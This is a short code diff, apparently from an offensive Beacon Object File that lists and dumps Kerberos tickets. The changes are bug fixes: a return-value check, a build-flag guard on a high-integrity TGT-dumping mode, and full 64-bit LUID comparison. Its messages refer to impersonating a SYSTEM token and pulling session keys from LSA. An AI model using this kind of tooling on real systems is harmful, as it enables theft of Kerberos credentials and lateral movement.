@@ -184,14 +184,15 @@ DateTime FileTimeToDateTime(LARGE_INTEGER li) {
     ft.dwHighDateTime = li.HighPart;
     ft.dwLowDateTime = li.LowPart;
     SYSTEMTIME st;
-    KERNEL32$FileTimeToSystemTime(&ft, &st);
-    dt.isSet = 1;
-    dt.year = st.wYear;
-    dt.month = st.wMonth;
-    dt.day = st.wDay;
-    dt.hour = st.wHour;
-    dt.minute = st.wMinute;
-    dt.second = st.wSecond;
+    if (KERNEL32$FileTimeToSystemTime(&ft, &st)) {
+        dt.isSet = 1;
+        dt.year = st.wYear;
+        dt.month = st.wMonth;
+        dt.day = st.wDay;
+        dt.hour = st.wHour;
+        dt.minute = st.wMinute;
+        dt.second = st.wSecond;
+    }
     return dt;
 }
 
@@ -512,8 +513,13 @@ void KLIST( char* luid, char* targetService, char* targetUser, char* targetClien
             PRINT_OUT("[!] /high requested but we are already SYSTEM. Use /system or no flag for the SYSTEM path.\n");
             return;
         }
+#ifndef DUMP
+        PRINT_OUT("[X] /high is only supported in DUMP builds (use krb_dump_high, not krb_klist_high).\n");
+        return;
+#else
         PRINT_OUT("[*] High-integrity mode: dumping TGTs via KerbRetrieveTicketMessage (no SYSTEM).\n");
         PRINT_OUT("[*] LSA returns full session keys only for foreign LUIDs in this mode.\n\n");
+#endif
     }
     else {
         // If we're elevated but not yet SYSTEM, impersonate winlogon's SYSTEM token
@@ -650,8 +656,10 @@ void KLIST( char* luid, char* targetService, char* targetUser, char* targetClien
 //                 }
 
                 // If a specific LUID was requested, skip non-matches.
+                // Compare both HighPart and LowPart — LUIDs are 64-bit.
                 if (targetLuid.LowPart != 0 &&
-                    (sessLuid.LowPart != targetLuid.LowPart)) {
+                    (sessLuid.LowPart != targetLuid.LowPart ||
+                     sessLuid.HighPart != targetLuid.HighPart)) {
                     SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
                     continue;
                 }
